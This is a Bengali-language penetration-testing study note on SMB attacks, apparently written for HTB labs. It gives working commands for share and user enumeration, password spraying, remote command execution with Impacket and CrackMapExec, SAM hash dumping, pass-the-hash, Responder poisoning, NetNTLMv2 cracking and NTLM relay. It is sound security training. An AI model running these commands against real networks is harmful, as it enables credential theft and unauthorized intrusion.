## 1. SMB Attack Overview

SMB (Server Message Block) হলো network-এ file ও printer share করার protocol।

- `TCP 445` — Direct SMB।
- `TCP 139` — SMB over NetBIOS।
- `Samba` — Linux/Unix-এ SMB implementation।
- `MS-RPC` — SMB-এর named pipe ব্যবহার করে remote procedure call করতে পারে।

SMB attack-এর প্রধান লক্ষ্য:

- Misconfiguration: Anonymous access বা অতিরিক্ত permission।
- Enumeration: User, share, group ও policy সম্পর্কে তথ্য সংগ্রহ।
- Credential attacks: Brute force, password spraying।
- Windows attacks: Remote Command Execution (RCE), SAM hash extraction, Pass-the-Hash (PtH)।
- Forced authentication: Responder দিয়ে NetNTLM hash capture করার চেষ্টা।

## 2. Initial Enumeration — Nmap

```
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

| Option      | কাজ                        |
| ----------- | -------------------------- |
| `-sV`       | Service version শনাক্ত করা |
| `-sC`       | Default NSE scripts চালানো |
| `-p139,445` | SMB-related TCP port scan  |

Example findings:

```
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
NetBIOS name: HTB
Message signing enabled but not required
```

এখান থেকে SMB service, সম্ভাব্য implementation, hostname ও signing configuration সম্পর্কে ধারণা পাওয়া যায়। Windows-এর ক্ষেত্রে Nmap-এর OS/version identification সবসময় নির্ভুল নয়।

## 3. Anonymous Authentication & Share Enumeration

Null session: Username ও password ছাড়া SMB connection করার চেষ্টা। Server অনুমতি দিলে anonymous access পাওয়া যায়।

### smbclient

```
smbclient -N -L //10.129.14.128
```

- `-N` — Password prompt ছাড়া চেষ্টা করে।
- `-L` — Share list দেখায়।

### SMBMap

```
smbmap -H 10.129.14.128
```

Example:

```
Share       Permissions
ADMIN$      NO ACCESS
C$          NO ACCESS
IPC$        READ ONLY
notes       READ, WRITE
```

Share-এর directory list দেখতে:

```
smbmap -H 10.129.14.128 -r notes
```

Recursive listing-এর জন্য `-R` ব্যবহার করা যায়।

File download:

```
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

File upload:

```
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

মনে রাখবে: `READ` মানে পড়ার permission, `WRITE` মানে লেখার permission। তবে বাস্তব access authentication ও server configuration-এর ওপর নির্ভর করে।

## 4. RPC ও Automated Enumeration

### rpcclient

```
rpcclient -U'%' 10.10.110.17
```

`-U'%'` — Empty username/password দিয়ে authentication চেষ্টা করে।

গুরুত্বপূর্ণ query:

| Query             | কাজ                |
| ----------------- | ------------------ |
| `enumdomusers`    | User list          |
| `srvinfo`         | Server information |
| `enumdomains`     | Domain enumeration |
| `querydominfo`    | Domain information |
| `netshareenumall` | Share enumeration  |
| `queryuser <RID>` | User details       |

Example:

```
user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
```

### Enum4linux-ng

```
./enum4linux-ng.py 10.10.11.45 -A -C
```

- `-A` — Comprehensive enumeration।
- `-C` — Source-এ ব্যবহৃত option; tool version অনুযায়ী help দেখে অর্থ যাচাই করবে।

এটি SMB, NetBIOS, user, group, share, OS ও password policy-সংক্রান্ত তথ্য সংগ্রহ করতে পারে।

Links: [enum4linux](https://github.com/CiscoCXSecurity/enum4linux?utm_source=chatgpt.com) · [enum4linux-ng](https://github.com/cddmp/enum4linux-ng?utm_source=chatgpt.com)

## 5. Brute Force vs Password Spraying

| Technique         | কীভাবে কাজ করে                                    |
| ----------------- | ------------------------------------------------- |
| Brute Force       | একটি account-এর বিরুদ্ধে অনেক password চেষ্টা     |
| Password Spraying | অনেক user-এর বিরুদ্ধে একটি common password চেষ্টা |

Brute force-এ account lockout-এর ঝুঁকি বেশি। Password spraying-ও lockout ঘটাতে পারে; তাই অনুমোদিত lab-এর password policy ও lockout threshold বুঝে কাজ করতে হবে।

Example user list (`/tmp/userlist.txt`):

```
Administrator
jrodriguez
admin
jurena
```

CrackMapExec দিয়ে password spraying:

```
crackmapexec smb 10.10.110.17 \
-u /tmp/userlist.txt -p 'Company01!' --local-auth
```

- `-u` — Username বা user-list file।
- `-p` — Password।
- `--local-auth` — Local account দিয়ে authentication।

অতিরিক্ত option:

```
--continue-on-success
```

একটি valid login পাওয়ার পরও পরীক্ষা চালিয়ে যেতে ব্যবহৃত হয়।

`STATUS_LOGON_FAILURE` মানে authentication ব্যর্থ হয়েছে। `(Pwn3d!)` হলো tool-এর output-এ সফল authentication ও administrative capability নির্দেশ করার marker; এর সঠিক অর্থ context অনুযায়ী যাচাই করতে হবে।

Reference: [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec?utm_source=chatgpt.com)

## 6. Windows SMB — Remote Command Execution (RCE)

Windows SMB-তে যথেষ্ট privilege থাকলে remote command execution, logged-on user enumeration এবং SAM hash extraction সম্ভব হতে পারে।

### PsExec ও Impacket

PsExec: Remote Windows machine-এ process চালায়। সাধারণত service তৈরি করে, SMB-এর মাধ্যমে executable transfer করে এবং Windows Service Control Manager ব্যবহার করে।

গুরুত্বপূর্ণ tools:

| Tool               | কাজ                                          |
| ------------------ | -------------------------------------------- |
| `impacket-psexec`  | PsExec-সদৃশ remote execution                 |
| `impacket-smbexec` | SMB ব্যবহার করে remote command execution     |
| `impacket-atexec`  | Task Scheduler ব্যবহার করে command execution |
| CrackMapExec       | SMB enumeration ও remote execution           |
| Metasploit PsExec  | Metasploit-এর PsExec implementation          |

Impacket-এর help:

```
impacket-psexec -h
```

উদাহরণস্বরূপ, HTB lab-এ authorized administrator credentials দিয়ে connection:

```
impacket-psexec administrator:'Password123!'@10.10.110.17
```

Successful privileged session-এ:

```
whoami && hostname
```

সম্ভাব্য output:

```
nt authority\system
WIN7BOX
```

`NT AUTHORITY\SYSTEM` হলো Windows-এর অত্যন্ত privileged system account।

### CrackMapExec দিয়ে Command Execution

```
crackmapexec smb 10.10.110.17 \
-u Administrator -p 'Password123!' \
-x 'whoami' --exec-method smbexec
```

- `-x` — CMD command।
- `-X` — PowerShell command।
- `--exec-method smbexec` — SMBExec method নির্দিষ্ট করে।

Source অনুযায়ী, method নির্দিষ্ট না করলে CrackMapExec প্রথমে `atexec` চেষ্টা করতে পারে।

### Logged-on User Enumeration

```
crackmapexec smb 10.10.110.0/24 \
-u administrator -p 'Password123!' --loggedon-users
```

`--loggedon-users` — অনুমোদিত access থাকলে target machine-এ logged-on user শনাক্ত করতে ব্যবহৃত হয়।

## 7. SAM Hash Extraction

SAM (Security Account Manager): Windows local account ও password hash-সংক্রান্ত database।

Administrative privileges থাকলে SAM hash সংগ্রহ করা সম্ভব হতে পারে।

```
crackmapexec smb 10.10.110.17 \
-u administrator -p 'Password123!' --sam
```

Example output format:

```
username:RID:LMHASH:NTHASH:::
```

এখানে:

- `username` — Account name।
- `RID` — Relative Identifier।
- `LMHASH` — LM hash field।
- `NTHASH` — NT hash field।

SAM hash ব্যবহারের সম্ভাব্য উদ্দেশ্য হলো authorized testing-এ password auditing, hash cracking ও Pass-the-Hash ঝুঁকি যাচাই।

## 8. Pass-the-Hash (PtH)

Pass-the-Hash: Plaintext password-এর বদলে NTLM hash ব্যবহার করে authentication করার technique। Hash crack করা না গেলেও কিছু পরিস্থিতিতে সেটি authentication-এর জন্য ব্যবহার করা সম্ভব হতে পারে।

CrackMapExec-এর source example:

```
crackmapexec smb 10.10.110.17 \
-u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

- `-u` — Username।
- `-H` — NTLM hash।

মূল ধারণা: Hash জানলেই সব system-এ access নিশ্চিত নয়। NTLM support, account privileges ও target security configuration গুরুত্বপূর্ণ।

## 9. Forced Authentication — Responder

Responder হলো LLMNR, NBT-NS ও MDNS poisoning এবং বিভিন্ন fake service পরিচালনার tool। Misconfigured network-এ এটি authentication challenge/response capture করতে পারে।

Link: [Responder GitHub](https://github.com/lgandx/Responder?utm_source=chatgpt.com)

Lab example:

```
sudo responder -I ens33
```

`-I` — Network interface নির্ধারণ করে।

### কীভাবে কাজ করে?

1. Windows কোনো hostname resolve করার চেষ্টা করে।
2. Local hosts file ও DNS resolution ব্যর্থ হলে কিছু পরিস্থিতিতে LLMNR/NBT-NS/MDNS ব্যবহার হতে পারে।
3. Responder spoofed response দিয়ে fake server-এর দিকে client-কে পরিচালিত করতে পারে।
4. Client authentication করলে Responder NetNTLMv1/v2 challenge-response capture করতে পারে।

NetNTLMv2 hash plaintext password নয়। এটি captured challenge-response data; এর নিরাপত্তাগত প্রভাব authentication protocol ও environment-এর ওপর নির্ভর করে।

## 10. NetNTLMv2 Hash Cracking

Responder-এর log directory:

```
/usr/share/responder/logs/
```

Hashcat-এর `-m 5600` হলো NetNTLMv2 mode।

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

| অংশ           | কাজ                 |
| ------------- | ------------------- |
| `-m 5600`     | NetNTLMv2 hash mode |
| `hash.txt`    | Captured hash file  |
| `rockyou.txt` | Password wordlist   |

Source-এর example-এ recovered password ছিল `P@ssword`।

একই account-এর জন্য captured hash আলাদা হতে পারে, কারণ NetNTLMv2 challenge-response-এ randomized challenge ব্যবহৃত হয়।

Link: [Hashcat](https://hashcat.net/hashcat/?utm_source=chatgpt.com)

## 11. NTLM Relay

NTLM Relay: Captured authentication exchange-কে অন্য target-এ relay করে authentication সম্পন্ন করার চেষ্টা। সফলতা target-এর signing, authentication ও privilege configuration-এর ওপর নির্ভর করে।

Source-এ ব্যবহৃত tool:

- [Impacket ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py?utm_source=chatgpt.com)
- [Responder MultiRelay](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py?utm_source=chatgpt.com)

Responder-এর configuration file:

```
/etc/responder/Responder.conf
```

Source example-এ `SMB = Off` করা হয়েছে। এটি relay setup-এর অংশ; ভুল configuration network-এ অনাকাঙ্ক্ষিত প্রভাব ফেলতে পারে।

`impacket-ntlmrelayx`-এর গুরুত্বপূর্ণ options:

| Option             | অর্থ                                      |
| ------------------ | ----------------------------------------- |
| `-t`               | Target নির্ধারণ                           |
| `-smb2support`     | SMB2 support                              |
| `--no-http-server` | HTTP server বন্ধ রাখা                     |
| `-c`               | নির্দিষ্ট command execution configuration |

এই technique শুধু অনুমোদিত lab-এ পরীক্ষা করবে। Captured authentication relay করা বা অন্য machine-এ command চালানো অননুমোদিত environment-এ গুরুতর security incident তৈরি করতে পারে।

## 12. RPC দিয়ে পরিবর্তন

RPC শুধু enumeration-এর জন্য নয়; configuration ও permission অনুমতি দিলে কিছু system-এ পরিবর্তনও করা যায়।

- User-এর password পরিবর্তন।
- নতুন domain user তৈরি।
- নতুন shared folder তৈরি।

এসব কাজের জন্য নির্দিষ্ট RPC permissions ও server configuration প্রয়োজন।
